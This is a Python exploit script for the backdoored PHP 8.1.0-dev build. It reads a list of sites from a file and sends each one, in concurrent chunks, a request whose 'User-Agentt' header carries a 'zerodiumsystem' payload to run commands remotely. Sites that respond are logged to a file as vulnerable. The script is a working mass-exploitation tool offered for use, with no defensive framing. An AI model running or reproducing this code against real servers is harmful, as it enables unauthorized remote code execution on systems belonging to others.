#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# Exploit Title: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
__author__ = 'Who Knows'
__version__ = '0.1'

import aiohttp
import asyncio
import os

cmd = "id"
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0',
    'User-Agentt': 'zerodiumsystem("echo who knows");',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
}


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def save_result(data):
    with open("valu.txt", 'a') as file:
        file.write(f'{data}\n')
        file.close()


async def rce(session, url):
    try:
        async with session.get(url, timeout=10, ssl=False, allow_redirects=False, headers=headers) as response:
            # print(response.status)
            html = await response.text()
            stdout = html.split('<!DOCTYPE html>', 1)
            if cmd in stdout[0]:
                print(f"valu => {url}  cmd : {stdout[0]}")
                save_result(url)
            else:
                print(f"Not valu => {url}")
    except aiohttp.ClientError as e:
        print(f"Error accessing {url}: {e}")


async def process_chunk(session, chunk):
    tasks = [rce(session, url) for url in chunk]
    await asyncio.gather(*tasks, return_exceptions=True)


async def main():
    try:
        file_path = input('[XxX] Enter site List: ').strip()
        chunk_size = int(input("Enter chunk  size : "))
        with open(file_path, encoding='utf-8', mode='r') as file:
            url_list = file.read().splitlines()
            url_list = [url if url.startswith("http://") else "http://" + url for url in url_list]
    except IOError as e:
        print(f"Error reading file: {e}")
        return

    async with aiohttp.ClientSession() as session:
        for i in range(0, len(url_list), chunk_size):
            chunk = url_list[i:i + chunk_size]
            await process_chunk(session, chunk)


if __name__ == '__main__':
    clear_screen()
    asyncio.run(main())
